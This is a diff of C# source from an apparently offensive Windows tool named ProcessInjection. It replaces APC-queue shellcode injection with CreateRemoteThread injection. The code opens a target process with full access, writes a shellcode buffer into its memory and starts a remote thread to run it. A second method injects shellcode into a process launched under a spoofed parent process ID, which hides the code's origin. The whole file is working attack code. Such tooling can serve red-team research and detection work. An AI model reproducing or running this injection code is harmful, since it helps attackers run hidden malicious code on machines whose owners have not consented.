@@ -1,26 +1,21 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using static ProcessInjection.Native.Win32API;
 using static ProcessInjection.Native.Enums;
 using static ProcessInjection.Native.Structs;
-using static ProcessInjection.Native.Constants;
 using static ProcessInjection.Utils.Utils;
 using System.Runtime.InteropServices;
 using ProcessInjection.Native;
 
 namespace ProcessInjection.PInvoke
 {
-    public class APCQueue
+    public class CreateRemoteThread
     {
-
-        public static void APCInject(int pid, int threadid, byte[] buf)
+        public static void CodeInject(int pid, byte[] buf)
         {
             try
             {
                 uint lpNumberOfBytesWritten = 0;
+                uint lpThreadId = 0;
                 PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                 IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
                 PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
@@ -31,17 +26,16 @@ namespace ProcessInjection.PInvoke
                 if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                 {
                     PrintInfo($"[!] Shellcode written in the process memory.");
-                    IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)threadid);
-                    PrintInfo($"[!] Add the thread {tHandle} to queue for execution when it enters an alertable state.");
-                    IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
-                    PrintInfo($"[!] Resume the thread {tHandle}");
-                    ResumeThread(tHandle);
+                    PrintInfo($"[!] Creating remote thread to execute the shellcode.");
+                    IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
+                    bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
                     PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                 }
                 else
                 {
                     PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                 }
+                //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                 bool hOpenProcessClose = CloseHandle(pHandle);
             }
             catch (Exception ex)
@@ -51,11 +45,12 @@ namespace ProcessInjection.PInvoke
             }
         }
 
-        public static void PPIDAPCInject(string binary, byte[] shellcode, int parentpid)
+        public static void PPIDCodeInject(string binary, byte[] shellcode, int parentpid)
         {
+
             PPIDSpoofing Parent = new PPIDSpoofing();
             PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
-            APCInject(pinf.dwProcessId, pinf.dwThreadId, shellcode);
+            CodeInject(pinf.dwProcessId, shellcode);
         }
     }
 }
